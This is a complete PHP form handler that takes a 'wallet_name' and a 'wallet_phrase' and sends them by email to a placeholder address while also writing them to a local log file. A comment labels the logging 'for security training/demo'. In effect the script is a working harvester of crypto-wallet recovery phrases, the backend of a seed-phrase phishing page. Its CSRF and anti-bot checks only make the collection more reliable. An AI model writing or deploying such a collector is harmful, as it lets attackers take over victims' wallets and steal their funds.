<?php
session_start();

// CSRF token check
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    exit("Invalid CSRF token.");
}

// Honeypot anti-bot check
if (!empty($_POST['extra_field'])) {
    http_response_code(400);
    exit("Bot detected.");
}

// Input validation & sanitation
$expected_fields = ['wallet_name', 'wallet_phrase'];
$clean_data = [];

foreach ($expected_fields as $field) {
    if (isset($_POST[$field])) {
        $value = trim($_POST[$field]);
        if (strlen($value) < 5 || strlen($value) > 200) {
            http_response_code(422);
            exit("Invalid input for $field.");
        }
        $clean_data[$field] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    } else {
        http_response_code(422);
        exit("Missing $field.");
    }
}

// Compose email
$to = "your_email@example.com";
$subject = "New Wallet Input Received";
$headers = "From: wallet@app.com\r\nContent-Type: text/plain; charset=UTF-8";
$body = "Wallet Submission Details:\n";

foreach ($clean_data as $key => $value) {
    $body .= ucfirst($key) . ": " . $value . "\n";
}

// Logging (for security training/demo)
$log_file = __DIR__ . '/form_log.txt';
file_put_contents($log_file, date('Y-m-d H:i:s') . " - " . json_encode($clean_data) . PHP_EOL, FILE_APPEND);

// Send the email
mail($to, $subject, $body, $headers);
echo "success";
?>
